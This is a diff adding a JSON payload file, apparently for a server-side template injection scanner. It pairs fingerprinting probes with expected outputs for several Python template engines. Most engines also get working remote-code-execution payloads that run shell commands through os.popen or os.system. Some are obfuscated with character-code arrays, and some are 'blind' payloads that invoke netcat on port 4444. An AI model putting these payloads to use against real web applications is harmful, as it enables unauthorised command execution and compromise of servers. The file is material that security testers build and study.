@@ -1,0 +1,75 @@
+{
+  "jinja2": {
+    "payloads": {
+      "{{7*7}}" :"49",
+      "{{7*'7'}}":"7777777"
+    },
+    "exploit": {
+      "rce": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}"
+    }
+  },
+  "mako": {
+    "payloads": {
+      "${7*7}" :"49"
+    },
+    "exploit": {
+      "rce" : "${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}",
+      "rce2" : "${__import__('os').popen('id').read()}"
+    }
+  },
+  "django": {
+    "payloads": {
+      "{{7*7}}" :"49",
+      "{{ 7|add:\"7\" }}": "14"
+    },
+    "exploit": {
+      "info": "{% debug %}"
+    }
+  },
+  "tornado": {
+    "payloads": {
+      "{%for i in [1,2,3]%}{{i}}{%end%}" :"123",
+      "{{7*'7'}}":"7777777",
+      "{{7*7}}" :"49"
+    },
+    "exploit": {
+      "rce": "{{__import__('os').popen('id').read()}}",
+      "blind_rce": "{% import os %}{{os.system('nc localhost 4444')}}"
+    }
+  },
+  "bottle": {
+    "payloads": {
+      "{{7*7}}" :"49",
+      "{{7*'7'}}":"7777777"
+    },
+    "exploit": {
+      "rce": "{{__import__('os').popen('id').read()}}",
+      "blind_rce": "{% import os %}{{os.system('nc localhost 4444')}}"
+    }
+  },
+  "chameleon": {
+    "payloads": {
+      "{{7*7}}" :"49",
+      "<div tal:condition=\"True\">CHAMELEON</div>": "<div>CHAMELEON</div> "
+    },
+    "exploit": {
+      "rce": "${__import__('os').popen('id').read()}"
+    }
+  },
+  "cheetah": {
+    "payloads": {
+      "{{7*7}}" :"49"
+    },
+    "exploit": {
+      "rce": "<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}",
+      "rce2": "${__import__('os').popen('id').read()}"
+    }
+  },
+  "pystache": {
+    "payloads": {
+      "y{{=<% %>=}}es" :"yes"
+    },
+    "exploit": {
+    }
+  }
+}
